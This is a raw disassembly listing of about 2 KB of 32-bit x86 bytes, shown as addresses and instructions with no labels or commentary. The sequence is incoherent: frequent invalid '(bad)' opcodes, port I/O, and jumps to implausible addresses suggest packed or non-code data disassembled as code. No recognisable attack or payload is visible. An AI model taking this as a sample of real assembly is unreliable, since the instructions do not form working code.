  423fb5:	cwde   
  423fb6:	push   ebx
  423fb7:	add    eax,0xe7dd3dfd
  423fbc:	sahf   
  423fbd:	out    dx,eax
  423fbe:	dec    BYTE PTR [esi-0x3d]
  423fc1:	pop    esi
  423fc2:	sbb    esp,0x50
  423fc5:	test   ch,bl
  423fc7:	push   eax
  423fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fc9:	clc    
  423fca:	fcom   QWORD PTR ds:0x3fb8a5
  423fd0:	not    BYTE PTR [eax+0x24]
  423fd3:	or     edx,DWORD PTR [edx]
  423fd5:	push   ds
  423fd6:	fnstsw WORD PTR [eax]
  423fd8:	enter  0x6202,0x57
  423fdc:	add    BYTE PTR [eax],al
  423fde:	add    BYTE PTR [eax],al
  423fe0:	add    BYTE PTR [edi-0x38cf49d1],al
  423fe6:	test   DWORD PTR [eax+eax*8+0x10],ebp
  423fea:	ror    DWORD PTR [edx+0x34],cl
  423fed:	sbb    eax,0xfedd7eda
  423ff2:	jl     0x42401d
  423ff4:	or     eax,0x36323ce0
  423ff9:	frstor [edx+0x33eeddaa]
  423fff:	outs   dx,DWORD PTR ds:[esi]
  424000:	inc    edi
  424001:	fidiv  WORD PTR [edx]
  424003:	mov    esi,0xe8fe1bca
  424008:	jmp    0x424084
  42400a:	inc    edx
  42400b:	or     bl,ch
  42400d:	add    eax,0x75082701
  424012:	das    
  424013:	pop    DWORD PTR [ebx]
  424015:	mov    dh,BYTE PTR [edi-0x158dfc81]
  42401b:	lds    ebx,FWORD PTR [esi+ebp*4]
  42401e:	shr    BYTE PTR [edi-0x40],cl
  424021:	dec    edx
  424022:	shl    ch,0x3
  424025:	lea    ebp,[ebp-0x3f8afc6c]
  42402b:	in     eax,0x3
  42402d:	cmp    ch,BYTE PTR [ebx]
  42402f:	push   ecx
  424030:	adc    dh,ch
  424032:	inc    ecx
  424033:	jmp    0x8e52b5a1
  424038:	fmul   QWORD PTR [eax+0x7543d976]
  42403e:	jge    0x423fe1
  424040:	xchg   BYTE PTR [esi+0x57],bl
  424043:	aad    0x36
  424045:	add    BYTE PTR [eax],al
  424047:	add    BYTE PTR [eax],al
  424049:	add    dl,dh
  42404b:	pop    ds
  42404c:	gs repz xchg edx,eax
  42404f:	add    dh,BYTE PTR [ebx]
  424051:	push   0x75
  424053:	fst    st(6)
  424055:	xor    eax,0xf370f83e
  42405a:	jp     0x42405e
  42405c:	add    BYTE PTR [esi+esi*1+0x57],ch
  424060:	add    ebx,DWORD PTR [ecx]
  424062:	dec    eax
  424063:	clc    
  424064:	xchg   edi,eax
  424065:	stc    
  424066:	mov    dh,0x2
  424068:	push   edx
  424069:	mov    dh,0x39
  42406b:	mov    eax,0xd4fb5987
  424070:	jne    0x4240b7
  424072:	inc    esi
  424073:	xor    eax,0xf821e8af
  424078:	(bad)  
  424079:	fnstenv [esi-0x4e6ba5fe]
  42407f:	mov    BYTE PTR [edi+0x6b492],bh
  424085:	es dec edx
  424087:	es add al,0xbb
  42408a:	dec    esp
  42408b:	add    esp,DWORD PTR [esi-0x17]
  42408e:	fiadd  WORD PTR [ecx-0xa]
  424091:	push   cs
  424092:	test   eax,0xa1e90490
  424097:	push   esi
  424098:	and    al,0xe5
  42409a:	test   BYTE PTR [eax+0x0],ch
  42409d:	xor    DWORD PTR [esi-0x26],0x3e
  4240a1:	repz into 
  4240a3:	int    0xbe
  4240a5:	in     eax,dx
  4240a6:	jbe    0x4240df
  4240a8:	xchg   ebp,ecx
  4240aa:	lock fisub WORD PTR [eax]
  4240ad:	in     eax,dx
  4240ae:	add    BYTE PTR [eax],al
  4240b0:	add    BYTE PTR [eax],al
  4240b2:	add    BYTE PTR [esi+0x2],dh
  4240b5:	push   edx
  4240b6:	ss cld 
  4240b8:	xchg   edi,eax
  4240b9:	faddp  st(2),st
  4240bb:	sahf   
  4240bc:	int    0x87
  4240be:	ret    
  4240bf:	mov    DWORD PTR [esi+0x74eb62e],ebx
  4240c5:	scas   al,BYTE PTR es:[edi]
  4240c6:	call   0xfda84341
  4240cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240cc:	push   0xaac46c00
  4240d1:	jg     0x424074
  4240d3:	ficomp DWORD PTR cs:[ebx-0x7a32d09f]
  4240da:	add    BYTE PTR [esp+ebp*1],cl
  4240dd:	sbb    eax,0x6816128b
  4240e2:	rcr    bl,0x48
  4240e5:	add    BYTE PTR [ebp-0x2696f],cl
  4240eb:	fwait
  4240ec:	push   ss
  4240ed:	call   0xf7eece44
  4240f2:	test   DWORD PTR [ebp+edi*8-0x6c],ebx
  4240f6:	rcl    BYTE PTR [eax-0xf68a3a],0xc4
  4240fd:	pop    esi
  4240fe:	mov    DWORD PTR [ecx-0x5400026a],edx
  424104:	outs   dx,DWORD PTR ds:[esi]
  424105:	out    0x1,al
  424107:	fadd   QWORD PTR [ecx*4-0x84e917b]
  42410e:	call   DWORD PTR [edx+0x15400006]
  424114:	xor    bh,cl
  424116:	push   0x0
  42411b:	add    ah,ch
  42411d:	xor    al,BYTE PTR [eax+0x0]
  424120:	dec    ecx
  424121:	adc    eax,0xfffffffd
  424124:	mov    ebx,0xd1ff50ab
  424129:	sub    BYTE PTR [ecx],dl
  42412b:	inc    eax
  42412c:	pushf  
  42412d:	xchg   DWORD PTR [ebp+0x8],edi
  424130:	lea    esi,[edx]
  424132:	and    al,0x8b
  424134:	push   ebx
  424135:	add    bl,BYTE PTR [esi-0x7d]
  424138:	fs push es
  42413a:	je     0x424157
  42413c:	dec    esp
  42413d:	lods   eax,DWORD PTR ds:[esi]
  42413e:	adc    eax,0x449e90
  424143:	add    ecx,esp
  424145:	adc    al,0xf7
  424147:	ja     0x4241a9
  424149:	jnp    0x4240d0
  42414b:	rcr    BYTE PTR [ecx],1
  42414d:	lods   eax,DWORD PTR ds:[esi]
  42414e:	not    DWORD PTR [eax+0x4]
  424151:	std    
  424152:	(bad)  
  424155:	loopne 0x424163
  424157:	lea    esi,[ebp+0x5e]
  42415a:	scas   eax,DWORD PTR es:[edi]
  42415b:	std    
  42415c:	dec    edx
  42415d:	sub    DWORD PTR [edi],0xff9530e8
  424163:	call   FWORD PTR [edx+0x79beccef]
  424169:	fnstenv [eax]
  42416b:	xchg   DWORD PTR [ecx],ebx
  42416d:	pop    ebp
  42416e:	(bad)  
  424170:	les    ecx,FWORD PTR [edx-0x4a17adce]
  424176:	sbb    ecx,DWORD PTR [eax]
  424178:	sbb    eax,0xafb984d
  42417d:	gs shr eax,0x0
  424181:	add    BYTE PTR [eax],al
  424183:	add    BYTE PTR [eax],al
  424185:	and    eax,DWORD PTR [edi+0x19f1fbd6]
  42418b:	dec    ebx
  42418c:	push   ss
  42418d:	(bad)  [ebp-0x20]
  424190:	sti    
  424191:	jmp    0x7bd:0x318d044c
  424198:	call   0xfc1870a9
  42419d:	xor    esp,DWORD PTR [ebx-0x3e]
  4241a0:	push   edi
  4241a1:	inc    BYTE PTR [esi]
  4241a3:	cmp    BYTE PTR [esi-0x28ea2687],bh
  4241a9:	into   
  4241aa:	repnz out 0x82,al
  4241ad:	enter  0xd9d8,0xb0
  4241b1:	je     0x4241ce
  4241b3:	sti    
  4241b4:	call   FWORD PTR [edx-0x65045454]
  4241ba:	imul   edi,edi,0x14d979bd
  4241c0:	shl    BYTE PTR ds:0xb7010747,0xdd
  4241c7:	jmp    DWORD PTR [ecx-0xa]
  4241ca:	rol    BYTE PTR ds:0x9b74b0,cl
  4241d0:	add    al,al
  4241d2:	fs call 0xa1449b57
  4241d8:	xor    ebx,edx
  4241da:	dec    ebp
  4241db:	icebp  
  4241dc:	add    al,dl
  4241de:	cmp    BYTE PTR [edx],bh
  4241e0:	lea    esp,[ebx]
  4241e2:	jnp    0x42417c
  4241e4:	push   ecx
  4241e5:	jns    0x4241fb
  4241e7:	test   eax,0xed
  4241ec:	add    BYTE PTR [eax],al
  4241ee:	test   al,0x83
  4241f0:	sti    
  4241f1:	push   DWORD PTR [edx]
  4241f3:	push   esi
  4241f4:	leave  
  4241f5:	imul   edx,ebp,0x1
  4241f8:	jmp    0xe4dd4f00
  4241fd:	fstp   DWORD PTR [esi]
  4241ff:	test   DWORD PTR [ecx],ebp
  424201:	push   eax
  424202:	jl     0x42427f
  424204:	push   ecx
  424205:	in     al,dx
  424206:	and    BYTE PTR [edx+ecx*2-0x9fbe527],0xc3
  42420e:	in     al,dx
  42420f:	inc    edi
  424210:	in     eax,0x7e
  424212:	mov    ch,0x55
  424214:	sbb    ecx,DWORD PTR [ebp+0x5741066f]
  42421a:	add    cl,bh
  42421c:	and    al,BYTE PTR [eax+0x152f55b5]
  424222:	into   
  424223:	inc    esi
  424224:	rcl    BYTE PTR [esi+0x7d],1
  424227:	pop    eax
  424228:	clc    
  424229:	fmul   DWORD PTR [ecx+0x7152028b]
  42422f:	fimul  DWORD PTR [esi]
  424231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424232:	scas   al,BYTE PTR es:[edi]
  424233:	into   
  424234:	stos   BYTE PTR es:[edi],al
  424235:	sbb    al,0x28
  424237:	cli    
  424238:	jbe    0x424222
  42423a:	in     eax,0x0
  42423c:	inc    edx
  42423d:	cmp    al,BYTE PTR [edx+0x7b]
  424240:	les    esi,FWORD PTR [esi]
  424242:	rol    DWORD PTR ds:0xddf22ee9,cl
  424248:	push   0xe90465e7
  42424d:	add    ebp,DWORD PTR [edx]
  42424f:	cmp    BYTE PTR [edx],dl
  424251:	lea    eax,[eax]
  424253:	add    BYTE PTR [eax],al
  424255:	add    BYTE PTR [eax],al
  424257:	in     al,dx
  424258:	push   es
  424259:	add    dl,bh
  42425b:	sub    DWORD PTR [ebp+ecx*2-0x4f],edi
  42425f:	adc    ebp,0x3066d0b
  424265:	add    cl,ch
  424267:	add    DWORD PTR [edx+0x4],eax
  42426a:	fs mov ebp,0x1d2c8906
  424270:	retf   0xed50
  424273:	mov    ebx,0xaa650bc2
  424278:	add    al,BYTE PTR [eax]
  42427a:	jmp    0x5c4a8478
  42427f:	and    dh,BYTE PTR [esi-0x79]
  424282:	icebp  
  424283:	jmp    0x12fc3d8b
  424288:	add    eax,DWORD PTR [ebp+0x55]
  42428b:	stc    
  42428c:	inc    ecx
  42428d:	add    al,0x5c
  42428f:	lods   eax,DWORD PTR ds:[esi]
  424290:	push   es
  424291:	aas    
  424292:	inc    esi
  424293:	inc    esi
  424294:	push   es
  424295:	aaa    
  424296:	and    DWORD PTR [eax-0x54],ecx
  424299:	das    
  42429a:	adc    cl,BYTE PTR [edi+0x45b5fc2f]
  4242a0:	sbb    BYTE PTR fs:[ecx],dl
  4242a3:	outs   dx,DWORD PTR ds:[esi]
  4242a4:	dec    edi
  4242a5:	cli    
  4242a6:	push   ds
  4242a7:	jno    0x424236
  4242a9:	je     0x424278
  4242ab:	stc    
  4242ac:	aas    
  4242ad:	clc    
  4242ae:	bound  ebp,QWORD PTR [edi]
  4242b0:	push   es
  4242b1:	ret    
  4242b2:	jmp    0xe9829899
  4242b7:	jmp    FWORD PTR [edx]
  4242b9:	or     al,0x60
  4242bb:	add    BYTE PTR [eax],al
  4242bd:	add    BYTE PTR [eax],al
  4242bf:	add    BYTE PTR [esi-0xe],ch
  4242c2:	ret    0x6ea9
  4242c5:	mov    edx,0xc0712977
  4242ca:	inc    eax
  4242cb:	cmc    
  4242cc:	jns    0x424349
  4242ce:	dec    eax
  4242cf:	in     eax,dx
  4242d0:	call   edx
  4242d2:	out    0xeb,eax
  4242d4:	shl    BYTE PTR [bx],1
  4242d7:	add    BYTE PTR [edi-0x2672c5ce],bh
  4242dd:	mov    dh,0xfd
  4242df:	jmp    DWORD PTR [ebx]
  4242e1:	push   ss
  4242e2:	bound  eax,QWORD PTR ds:0xfe761234
  4242e8:	adc    eax,DWORD PTR [edx+0x7a6274c0]
  4242ee:	test   eax,esi
  4242f0:	loope  0x4242a6
  4242f2:	not    DWORD PTR [eax-0x29]
  4242f5:	mov    ah,0xe8
  4242f7:	call   0x8b4243f6
  4242fc:	pop    ecx
  4242fd:	scas   al,BYTE PTR es:[edi]
  4242fe:	mov    DWORD PTR [eax+0x18],ebx
  424301:	fst    DWORD PTR [eax+0x33010cd6]
  424307:	ret    
  424308:	cmp    al,bh
  42430a:	dec    edi
  42430b:	dec    DWORD PTR [ecx]
  42430d:	add    eax,0x711c400b
  424312:	add    ebx,ebp
  424314:	push   ss
  424315:	js     0x424315
  424317:	imul   ecx,DWORD PTR ds:0xccffc678,0x25fbff2
  424321:	or     cl,cl
  424323:	ret    0x0
  424326:	add    BYTE PTR [eax],al
  424328:	add    al,bl
  42432a:	add    BYTE PTR [esi-0x7d],bl
  42432d:	in     eax,0xd0
  42432f:	stos   DWORD PTR es:[edi],eax
  424330:	add    DWORD PTR [esi+0x5f660002],ebx
  424336:	inc    DWORD PTR [ebx]
  424338:	mov    al,0xcd
  42433a:	ret    0x4
  42433d:	fnstenv [edi-0x14]
  424340:	add    DWORD PTR [eax-0x63000562],0x9c8b4e0f
  42434a:	ja     0x424391
  42434c:	or     al,0xf
  42434e:	stc    
  42434f:	not    BYTE PTR [edi+0x7]
  424352:	(bad)  
  424353:	call   0xd380b8ce
  424358:	sti    
  424359:	lock and dl,bl
  42435c:	cmp    DWORD PTR [ebx+eax*8-0x2],0x7adc75ff
  424364:	shl    BYTE PTR [ecx+ebx*8-0x1],cl
  424368:	jle    0x424342
  42436a:	popf   
  42436b:	(bad)  
  42436c:	jle    0x42433e
  42436e:	ins    DWORD PTR es:[edi],dx
  42436f:	dec    DWORD PTR [ecx+esi*2-0x712d78dd]
  424376:	push   0xd9eb7e02
  42437b:	(bad)  
  42437c:	inc    DWORD PTR [esi+0x2d458c99]
  424382:	ret    
  424383:	inc    eax
  424384:	cld    
  424385:	jp     0x4243e2
  424387:	mov    eax,ds:0xbad97501
  42438c:	inc    ebp
  42438d:	add    BYTE PTR [eax],al
  42438f:	add    BYTE PTR [eax],al
  424391:	add    BYTE PTR ds:0x75ffffdb,ah
  424397:	push   edx
  424398:	inc    eax
  424399:	call   0xf89a9c31
  42439e:	jne    0x42434c
  4243a0:	or     BYTE PTR [ebp-0x7900268c],0x38
  4243a7:	xor    DWORD PTR [esi+0xb60e14d],eax
  4243ad:	or     dh,ch
  4243af:	jmp    0x424397
  4243b1:	sbb    edx,DWORD PTR [eax+0x24]
  4243b4:	rol    BYTE PTR [ebp+0x5885dcb5],cl
  4243ba:	je     0x424395
  4243bc:	inc    DWORD PTR [esi-0x13cfd153]
  4243c2:	out    dx,al
  4243c3:	sbb    esp,edi
  4243c5:	aam    0xfe
  4243c7:	retf   
  4243c8:	aad    0x87
  4243ca:	int    0x58
  4243cc:	(bad)  
  4243cd:	sti    
  4243ce:	jb     0x424435
  4243d0:	sub    al,BYTE PTR [ecx]
  4243d2:	jne    0x4243d6
  4243d4:	jmp    0x653dee57
  4243d9:	and    eax,0x10e90274
  4243de:	jle    0x4243db
  4243e0:	xchg   ecx,eax
  4243e1:	mov    ebp,0xbeed7717
  4243e6:	dec    ebp
  4243e7:	sub    DWORD PTR fs:[eax+edi*8],eax
  4243eb:	xchg   esp,eax
  4243ec:	adc    edi,edx
  4243ee:	pop    esi
  4243ef:	retf   
  4243f0:	rcl    esi,0xc2
  4243f3:	add    ch,cl
  4243f5:	mov    BYTE PTR [eax],al
  4243f7:	add    BYTE PTR [eax],al
  4243f9:	add    BYTE PTR [eax],al
  4243fb:	aaa    
  4243fc:	ja     0x424412
  4243fe:	call   0xec1e0fa8
  424403:	stos   DWORD PTR es:[edi],eax
  424404:	arpl   WORD PTR [edx-0xd3e0f2b],cx
  42440a:	jg     0x424445
  42440c:	add    ch,cl
  42440e:	add    esi,DWORD PTR [esi-0x782a999c]
  424414:	push   eax
  424415:	fwait
  424416:	jmp    0x42442c
  424418:	add    ch,cl
  42441a:	add    edi,edx
  42441c:	xor    al,0x61
  42441e:	mov    esp,DWORD PTR [eax+0x4ac25ede]
  424424:	scas   eax,DWORD PTR es:[edi]
  424425:	(bad)  
  424426:	out    dx,eax
  424427:	outs   dx,DWORD PTR ds:[esi]
  424428:	xchg   ebx,eax
  424429:	icebp  
  42442a:	sub    ah,0xf7
  42442d:	mov    ah,0x7
  42442f:	push   0xffffffc9
  424431:	in     al,0x4f
  424433:	jbe    0x4244b4
  424435:	sub    DWORD PTR [edx],eax
  424437:	mov    ds:0xfae797bf,al
  42443c:	leave  
  42443d:	into   
  42443e:	fldenv [edx+ecx*8-0x15b63f32]
  424445:	pop    ebx
  424446:	dec    esp
  424447:	mov    ebx,0x7f512e07
  42444c:	fs data16 sbb al,0x78
  424450:	push   ebp
  424451:	add    cl,ah
  424453:	inc    eax
  424454:	dec    ebx
  424455:	cmp    ebx,esp
  424457:	sub    ecx,esp
  424459:	xchg   BYTE PTR [eax+0x71fec1f5],ch
  42445f:	add    BYTE PTR [eax],al
  424461:	add    BYTE PTR [eax],al
  424463:	add    BYTE PTR [ebx],dh
  424465:	into   
  424466:	(bad)  
  424467:	in     eax,0xfb
  424469:	add    eax,0x7d76e900
  42446e:	jne    0x42442d
  424470:	(bad)  
  424471:	aas    
  424472:	clc    
  424473:	rol    DWORD PTR ds:0xe2b6fa51,1
  424479:	ret    0x1974
  42447c:	fcmove st,st(5)
  42447e:	je     0x42447e
  424480:	sub    DWORD PTR [eax-0x14],edx
  424483:	jb     0x42448e
  424485:	fild   DWORD PTR [ebx]
  424487:	outs   dx,BYTE PTR ds:[esi]
  424488:	sub    dh,cl
  42448a:	xchg   DWORD PTR [eiz*1-0x7aaa7e],ebx
  424491:	(bad)  
  424492:	nop
  424493:	fs ss dec edi
  424496:	xor    eax,0x87c66362
  42449b:	sbb    al,0x45
  42449d:	js     0x4244a3
  42449f:	push   0xd5000af5
  4244a4:	or     DWORD PTR [ecx+0x7a744130],eax
  4244aa:	cli    
  4244ab:	dec    esi
  4244ac:	and    DWORD PTR [eax-0x4],eax
  4244af:	add    BYTE PTR [edx+0x5f6b0bca],ch
  4244b5:	int    0xfb
  4244b7:	ss cmc 
  4244b9:	inc    edi
  4244ba:	cld    
  4244bb:	cs jno 0x42453d
  4244be:	int3   
  4244bf:	daa    
  4244c0:	test   eax,0x766eb8cd
  4244c5:	add    al,BYTE PTR [eax]
  4244c7:	add    BYTE PTR [eax],al
  4244c9:	add    BYTE PTR [eax],al
  4244cb:	add    BYTE PTR [eax],al
  4244cd:	out    dx,al
  4244ce:	add    al,BYTE PTR [eax]
  4244d0:	jmp    0x13e84c2
  4244d5:	sub    DWORD PTR [eax],esi
  4244d7:	hlt    
  4244d8:	call   0x386fcb
  4244dd:	ja     0x4244bb
  4244df:	pop    es
  4244e0:	mov    bh,0x53
  4244e2:	jp     0x4244e8
  4244e4:	lds    edi,FWORD PTR [eax+0x1100405c]
  4244ea:	mov    esi,0x43171b74
  4244ef:	or     BYTE PTR [ebx+0x17],dl
  4244f2:	mov    edi,?
  4244f4:	shl    al,1
  4244f6:	mov    esi,0x3be70f75
  4244fb:	lock mov ebx,DWORD PTR [ecx+0x2445bf02]
  424502:	push   ecx
  424503:	add    BYTE PTR [eax],al
  424505:	pop    esp
  424506:	inc    esi
  424507:	add    DWORD PTR [esi-0x21],esp
  42450a:	mov    ch,0xe
  42450c:	jne    0x424569
  42450e:	dec    eax
  42450f:	inc    ebp
  424510:	lock xlat BYTE PTR ds:[ebx]
  424512:	inc    ebx
  424513:	or     al,0xc7
  424515:	popa   
  424516:	mov    dh,0x94
  424518:	add    BYTE PTR [eax*1+0x33970189],bl
  42451f:	in     al,dx
  424520:	mov    ecx,edi
  424522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424523:	call   0x7bf7dfa2
  424528:	inc    ebp
  424529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42452a:	cli    
  42452b:	test   BYTE PTR [ebp-0x64],0x49
  42452f:	inc    ebp
  424530:	lock add BYTE PTR [eax],al
  424533:	add    BYTE PTR [eax],al
  424535:	add    ah,dl
  424537:	test   DWORD PTR [esp+edi*8-0x15],0xabfe717e
  42453f:	mov    ch,0xe3
  424541:	pop    es
  424542:	xchg   ebx,eax
  424543:	cmp    edi,eax
  424545:	(bad)  
  424546:	int3   
  424547:	add    al,0x0
  424549:	mov    esp,DWORD PTR [ecx]
  42454b:	mov    ecx,0xa6607d83
  424550:	sar    BYTE PTR [edx+0x75],0xf1
  424554:	into   
  424555:	(bad)  
  424556:	out    dx,al
  424557:	popf   
  424558:	(bad)  
  424559:	out    0x78,eax
  42455b:	inc    ebx
  42455c:	jne    0x42455e
  42455e:	jne    0x42453b
  424560:	cs pop edx
  424562:	ds and al,dl
  424565:	or     BYTE PTR [ebp+0x6e],dh
  424568:	jp     0x424556
  42456a:	imul   BYTE PTR [esi+0x10234f37]
  424570:	jnp    0x4245a7
  424572:	inc    ecx
  424573:	leave  
  424574:	aas    
  424575:	add    BYTE PTR [esi-0x65],al
  424578:	leave  
  424579:	inc    ebp
  42457a:	dec    ecx
  42457b:	fiadd  DWORD PTR [eax-0x658abf83]
  424581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424582:	push   cs
  424583:	cmp    BYTE PTR [ebx+0x58988566],bl
  424589:	or     BYTE PTR [edi],bl
  42458b:	dec    edi
  42458c:	dec    eax
  42458d:	aam    0xa5
  42458f:	push   0x7dd87fb9
  424594:	(bad)  
  424595:	jle    0x4245c8
  424597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424598:	add    BYTE PTR [ebp+0x0],0x0
  42459c:	add    BYTE PTR [eax],al
  42459e:	add    BYTE PTR [ecx],ah
  4245a0:	jmp    0x83ff:0xd99f46db
  4245a7:	xor    eax,0xa08cf5c7
  4245ac:	inc    ebp
  4245ad:	xlat   BYTE PTR ds:[ebx]
  4245ae:	sub    bl,BYTE PTR [edi-0x18480027]
  4245b4:	fcos   
  4245b6:	dec    DWORD PTR [edi+eax*2]
  4245b9:	add    al,0x0
  4245bb:	jne    0x4245e3
  4245bd:	dec    eax
  4245be:	aam    0x45
  4245c0:	xor    DWORD PTR [ebx+0x70],eax
  4245c3:	jne    0x42459e
  4245c5:	add    eax,0x69
  4245c8:	stos   DWORD PTR es:[edi],eax
  4245c9:	xor    BYTE PTR [ebp-0x37],0x41
  4245cd:	(bad)  
  4245ce:	gs jne 0x4245d3
  4245d1:	jmp    0xe9452b61
  4245d6:	add    ecx,esp
  4245d8:	push   eax
  4245d9:	call   0x84c5bae1
  4245de:	shl    DWORD PTR [ebp+0x75],cl
  4245e1:	lods   al,BYTE PTR ds:[esi]
  4245e2:	rol    DWORD PTR [ebp-0x26],cl
  4245e5:	icebp  
  4245e6:	pop    ebp
  4245e7:	jne    0x4245eb
  4245e9:	ins    DWORD PTR es:[edi],dx
  4245ea:	ret    
  4245eb:	and    ch,dh
  4245ed:	pop    ebx
  4245ee:	pop    eax
  4245ef:	test   edx,ebx
  4245f1:	aad    0x5b
  4245f3:	jne    0x4245f7
  4245f5:	rcl    BYTE PTR [ecx],1
  4245f7:	je     0x4245fb
  4245f9:	jmp    0x24b7a75b
  4245fe:	mov    eax,0xc42c75c5
  424603:	add    BYTE PTR [eax],al
  424605:	add    BYTE PTR [eax],al
  424607:	add    ch,al
  424609:	(bad)  
  42460a:	xchg   ebx,eax
  42460b:	test   DWORD PTR [ecx],edi
  42460d:	test   al,0xca
  424610:	mov    eax,DWORD PTR [edx]
  424612:	jmp    0x74c8fe91
  424617:	inc    edi
  424618:	inc    ecx
  424619:	xor    dl,BYTE PTR [ecx]
  42461b:	jns    0x424692
  42461d:	add    ch,cl
  42461f:	fisttp DWORD PTR [esi-0x5fc16aa]
  424625:	shl    DWORD PTR [eax+0x57],1
  424628:	sbb    eax,0xf901737d
  42462d:	mov    esi,0x7b7503e9
  424632:	or     al,0xd8
  424634:	fwait
  424635:	jmp    0xd8c0:0xc2f2b615
  42463c:	add    al,0x7d
  42463e:	aaa    
  42463f:	add    eax,esi
  424641:	xchg   edx,eax
  424642:	jmp    0x2345bb4a
  424647:	jl     0x424689
  424649:	sti    
  42464a:	ins    DWORD PTR es:[edi],dx
  42464b:	shr    BYTE PTR [edx-0xe19ff2d],cl
  424651:	add    BYTE PTR [eax],0xe9
  424654:	jbe    0x4246cb
  424656:	inc    edx
  424657:	add    DWORD PTR [esi+0x3d],ecx
  42465a:	clc    
  42465b:	imul   esi,DWORD PTR [edx],0x909bffff
  424661:	pusha  
  424662:	adc    al,0x5c
  424664:	cmp    ch,BYTE PTR [esi-0x1c38bb0]
  42466a:	dec    edi
  42466b:	inc    BYTE PTR [eax]
  42466d:	add    BYTE PTR [eax],al
  42466f:	add    BYTE PTR [eax],al
  424671:	stos   DWORD PTR es:[edi],eax
  424672:	inc    edx
  424673:	adc    ch,BYTE PTR [ecx-0x223bb88a]
  424679:	sti    
  42467a:	shl    DWORD PTR [ebp-0xe],0x9
  42467e:	cmp    eax,0xc46d70bc
  424683:	inc    ebp
  424684:	loop   0x4246fd
  424686:	fistp  QWORD PTR [esi]
  424688:	bound  edi,QWORD PTR [ebp+0xd]
  42468b:	inc    ebp
  42468c:	test   ebp,ecx
  42468e:	test   DWORD PTR [esi-0x37e1fad4],0x36832f68
  424698:	loopne 0x424710
  42469a:	push   eax
  42469b:	sub    ah,al
  42469d:	fwait
  42469e:	retf   0xfd6f
  4246a1:	rol    DWORD PTR [ebp+0x5d292c27],0x18
  4246a8:	xor    BYTE PTR [esi+0x3112f9d1],bl
  4246ae:	jmp    0x4246ff
  4246b0:	jle    0x42467d
  4246b2:	retf   0x7653
  4246b5:	and    ecx,DWORD PTR [edx]
  4246b7:	adc    ch,BYTE PTR [ecx]
  4246b9:	jns    0x424700
  4246bb:	(bad)  
  4246bc:	cmc    
  4246bd:	test   al,0xea
  4246bf:	push   edi
  4246c0:	adc    BYTE PTR [edx+0x593127ce],bh
  4246c6:	retf   0xa429
  4246c9:	mov    esi,0x34004545
  4246ce:	fnstcw WORD PTR [edx-0x39]
  4246d1:	aam    0xf6
  4246d3:	bnd jb 0x4246d6
  4246d6:	add    BYTE PTR [eax],al
  4246d8:	add    BYTE PTR [eax],al
  4246da:	push   edi
  4246db:	cmp    DWORD PTR [ebp+0xb],0x8d3f2cdc
  4246e2:	sbb    DWORD PTR [esi+0x50],esi
  4246e5:	push   0x74
  4246e7:	pop    ss
  4246e8:	lea    edi,[ebp+0x58]
  4246eb:	inc    esp
  4246ec:	inc    ebp
  4246ed:	call   0xfebbb566
  4246f2:	jae    0x424770
  4246f4:	shl    BYTE PTR [ebp-0x4e],0xb2
  4246f8:	jne    0x4246e2
  4246fa:	je     0x4246cc
  4246fc:	js     0x4246fc
  4246fe:	mov    ds:0x93fef2ab,eax
  424703:	mov    ch,0x4e
  424705:	call   0x387da4
  42470a:	ss (bad) 
  42470c:	push   ebx
  42470d:	push   eax
  42470e:	aad    0x3b
  424710:	hlt    
  424711:	lea    ebx,[ecx-0x4717af8e]
  424717:	aaa    
  424718:	idiv   bh
  42471a:	xlat   BYTE PTR ds:[ebx]
  42471b:	scas   al,BYTE PTR es:[edi]
  42471c:	test   esi,esi
  42471e:	mov    esi,eax
  424720:	call   0xf7f759fe
  424725:	mov    ebp,DWORD PTR [ecx-0x5a]
  424728:	add    DWORD PTR [ebp-0x28],0xb
  42472c:	push   0x11c97
  424731:	call   0x426e39
  424736:	mov    cl,BYTE PTR [eax-0x28]
  424739:	call   0x387d3c
  42473e:	add    BYTE PTR [eax],al
  424740:	add    BYTE PTR [eax],al
  424742:	add    BYTE PTR [ecx-0x1f170fd5],dh
  424748:	and    eax,0x99980000
  42474d:	jne    0x42475e
  42474f:	jne    0x4247af
  424751:	pop    ecx
  424752:	in     al,dx
  424753:	fnstsw WORD PTR [edx+0x5c]
  424756:	add    BYTE PTR [ebp-0x7d],dh
  424759:	jnp    0x42475b
  42475b:	jne    0x424738
  42475d:	(bad)  
  42475e:	push   es
  42475f:	call   0xe52b22e9
  424764:	ret    0xffff
  424767:	xchg   BYTE PTR [ebx],bl
  424769:	sub    ebx,DWORD PTR [edx+0x1e]
  42476c:	adc    bh,BYTE PTR [esi+0x52b7504]
  424772:	mov    esi,0x44d5db85
  424777:	push   ecx
  424778:	xlat   BYTE PTR ds:[ebx]
  424779:	add    al,0x52
  42477b:	out    dx,al
  42477c:	leave  
  42477d:	ret    0xe102
  424780:	push   eax
  424781:	aas    
  424782:	add    BYTE PTR [ecx],cl
  424784:	fnsave ds:0xca62fee8
  42478a:	sti    
  42478b:	out    dx,al
  42478c:	pushf  
  42478d:	sub    eax,0x76db71be
  424792:	push   edx
  424793:	icebp  
  424794:	pop    esi
  424795:	mov    cl,0x74
  424797:	lea    edx,[eax+0x45]
  42479a:	push   0x4e6813ee
  42479f:	(bad)
  4247a2:	cli    
  4247a3:	arpl   WORD PTR [ebp+0x37ca],dx
  4247a9:	add    BYTE PTR [eax],al
  4247ab:	add    BYTE PTR [ebx-0x35faa80f],dh
  4247b1:	mov    dl,0x7c
  4247b3:	inc    edx
  4247b4:	int    0x60
  4247b6:	test   DWORD PTR [eax-0x7b00268b],eax
  4247bc:	xor    eax,0xf386ecc6
  4247c1:	pop    ebp
  4247c2:	(bad)  
  4247c3:	push   DWORD PTR [ebp-0x1c]
  4247c6:	xor    al,0x8d
  4247c8:	xchg   ebx,eax
  4247c9:	std    
  4247ca:	xor    edi,ebx
  4247cc:	add    BYTE PTR [edx],0xed
  4247cf:	(bad)  
  4247d1:	sbb    DWORD PTR [ebx-0x32],0x57297d9e
  4247d8:	repnz xchg ebx,eax
  4247da:	call   0x2704e3a1
  4247df:	cmp    dl,bh
  4247e1:	(bad)  
  4247e2:	outs   dx,BYTE PTR ds:[esi]
